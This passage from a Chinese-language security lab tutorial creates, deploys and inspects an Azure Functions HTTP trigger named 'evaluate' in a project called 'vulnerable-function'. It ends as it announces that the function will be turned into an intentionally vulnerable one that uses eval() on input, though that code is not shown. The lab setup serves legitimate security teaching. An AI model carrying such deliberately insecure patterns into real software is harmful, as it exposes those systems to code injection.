  \ model is generally available. Learn more at https://aka.ms/AzFuncNodeV4\n```\n\
  \n```\nWriting package.json\nWriting .funcignore\nWriting .gitignore\nWriting host.json\n\
  Writing local.settings.json\nWriting /.../vulnerable-function/.vscode/extensions.json\n\
  Running 'npm install'...\n```\n\n#### Note\n\n在此步骤中，你正在使用 Azure Functions Core Tools——一个用于从命令行构建、管理和调试\
  \ Azure Functions 的本地开发和测试 CLI。你可以使用此 CLI 创建新函数、在本地运行它们、连接到 Azure 资源并将函数应用部署到云端。\n\
  \n##### 11. 让我们看看 `func init` 命令在上一步中创建的项目结构和文件。列出 `vulnerable-function` 目录中的文件和目录：\n\
  \n```\nls -1ahF\n```\n\n这应该会给出以下文件和目录：\n\n```\n./\n../\n.funcignore\nfunction-vars.sh\n\
  .gitignore\nhost.json\nlocal.settings.json\nnode_modules/\npackage.json\npackage-lock.json\n\
  src/\n.vscode/\n```\n\n下表更详细地描述了这些文件和目录：\n\n| File/directory || Description |\n\
  | --- | --- |\n| `.funcignore` || 用于指定在发布函数应用时排除哪些文件和文件夹的配置文件 |\n| --- | --- |\n\
  | `function-vars.sh` || 你在之前的步骤中创建的脚本，其中包含环境变量 `RESOURCE_GROUP`、`STORAGE_ACCOUNT`、`FUNCTION_APP`、`LOCATION`\
  \ |\n| `.gitignore` || 用于指定 Git 应忽略哪些文件和目录的配置文件 |\n| `host.json` || Azure Functions\
  \ 运行时的全局配置文件 |\n| `local.settings.json` || 用于存储在本地运行函数时使用的应用设置、连接字符串和密钥的文件 |\n|\
  \ `node_modules/` || 包含已安装的 `npm` 依赖项的目录 |\n| `package.json` || 包含函数应用的项目元数据、依赖项和脚本的配置文件\
  \ |\n| `package-lock.json` || 用于锁定确切依赖项版本而自动生成的文件 |\n| `src/` || 包含你的函数代码的目录 |\n\
  \n运行此命令以显示项目结构，最多显示两级深度：\n\n```\nfind . -maxdepth 2\n```\n\n这会给出以下输出：\n\n```\n.\n\
  ./package-lock.json\n./node_modules\n./node_modules/.bin\n./node_modules/.package-lock.json\n\
  ./node_modules/cookie\n./node_modules/undici\n./node_modules/azure-functions-core-tools\n\
  ./node_modules/long\n./node_modules/@fastify\n./node_modules/@azure\n./.funcignore\n\
  ./function-vars.sh\n./.vscode\n./.vscode/extensions.json\n./local.settings.json\n\
  ./package.json\n./.gitignore\n./host.json\n./src\n./src/functions\n```\n\n#####\
  \ 12. 生成一个名为 `evaluate` 的新函数：\n\n```\nfunc new --name evaluate --template \"HTTP\
  \ trigger\" --authlevel \"anonymous\"\n```\n\n完成后，这应该会产生以下输出：\n\n```\nFunction name:\
  \ [httpTrigger] Creating a new file /.../vulnerable-function/src/functions/evaluate.js\n\
  The function \"evaluate\" was created successfully from the \"HTTP trigger\" template.\n\
  ```\n\n这里，`func new` 创建了 `evaluate.js` 文件，其中包含你的新 HTTP 触发函数的基础代码。\n\n##### 13. 让我们看看刚刚生成的\
  \ `evaluate.js` 函数。递归列出 `src` 目录中的所有文件和子目录：\n\n```\nls -R src\n```\n\n这会产生以下输出：\n\
  \n```\nsrc:\nfunctions\n\nsrc/functions:\nevaluate.js\n```\n\n使用 `cat` 命令检查 `evaluate.js`\
  \ 中的内容：\n\n```\ncat src/functions/evaluate.js\n```\n\n这会返回以下代码行：\n\n```\nconst {\
  \ app } = require('@azure/functions');\n\napp.http('evaluate', {\n    methods: ['GET',\
  \ 'POST'],\n    authLevel: 'anonymous',\n    handler: async (request, context) =>\
  \ {\n        context.log(`Http function processed request for url\n            \"\
  ${request.url}\"`);\n\n        const name = request.query.get('name') || await request.text()\n\
  \            || 'world';\n\n        return { body: `Hello, ${name}!` };\n    }\n\
  });\n```\n\n这里，`evaluate.js` 文件包含使用“HTTP trigger”模板生成的样板代码。\n\n##### 14. 部署你的函数应用：\n\
  \n```\nfunc azure functionapp publish $FUNCTION_APP\n```\n\n这会产生以下输出：\n\n```\nSetting\
  \ Functions site property 'netFrameworkVersion' to 'v8.0'\nGetting site publishing\
  \ info...\n[2025-00-00T00:00:00.000Z] Starting the function app deployment...\n\
  Creating archive for current directory...\nUploading 625.52 KB [#########################################]\n\
  Upload completed successfully.\nDeployment completed successfully.\n[2025-00-00T00:00:00.000Z]\
  \ Syncing triggers...\nFunctions in functionapp...:\n    evaluate - [httpTrigger]\n\
  \        Invoke url: https://functionapp....azurewebsites.net/api/evaluate\n```\n\
  \n##### 15. 在新的浏览器标签页中打开输出中显示的 `Invoke url` 值，以确认函数按预期工作。\n\n#### Note\n\n你应该会看到消息\
  \ `Hello, world!`，这证实了一切都已正确设置。\n\n##### 16. 切换回 Cloud Shell 终端，然后运行以下命令以检索已部署函数应用的详细信息（`$`\
  \ 符号之后）：\n\n```\naz functionapp show \\\n  --resource-group $RESOURCE_GROUP \\\n\
  \  --name $FUNCTION_APP\n```\n\n这会给出以下输出：\n\n```\n{\n  \"appServicePlanId\": \"\
  ...\",\n  \"availabilityState\": \"Normal\",\n  \"clientAffinityEnabled\": false,\n\
  \  \"clientCertEnabled\": false,\n\n  ...\n\n  \"vnetImagePullEnabled\": false,\n\
  \  \"vnetRouteAllEnabled\": false,\n  \"workloadProfileName\": null\n}\n```\n\n\n\
  \n\n\n17. 由于上一步的 JSON 输出包含许多你暂时不需要的其他属性，请运行以下命令来获取你的函数应用的主机名：\n\n```\naz functionapp\
  \ show \\\n  --resource-group $RESOURCE_GROUP \\\n  --name $FUNCTION_APP \\\n  --query\
  \ defaultHostName \\\n  -o tsv\n```\n\n这应该返回以 `azurewebsites.net` 结尾的主机名。\n\n18.\
  \ 你也可以使用以下命令来获取你的函数的 Invoke URL：\n\n```\naz functionapp function list \\\n  --resource-group\
  \ $RESOURCE_GROUP \\\n  --name $FUNCTION_APP \\\n  --query \"[].invokeUrlTemplate\"\
  \ \\\n  -o json\n```\n\n这会产生以下输出：\n\n```\n[\n  \"https://functionapp....azurewebsites.net/api/evaluate\"\
  \n]\n```\n\n目前，你有一个使用脚手架模板代码的工作无服务器函数。在接下来的步骤中，你将把它转换为一个有意设计为易受攻击的函数，该函数使用 `eval()`\
  \ 来计算数学表达式：\n\n1. 点击 Editor 以访问 Cloud Shell 的内置代码编辑器（Figure 11-3）。\n\n![](img/lsse_1103.png)\n\
  \n2. 如果提示切换到 Classic Cloud Shell，请选择 Confirm。\n\n3. 导航到 `vulnerable-function` 目录：\n\
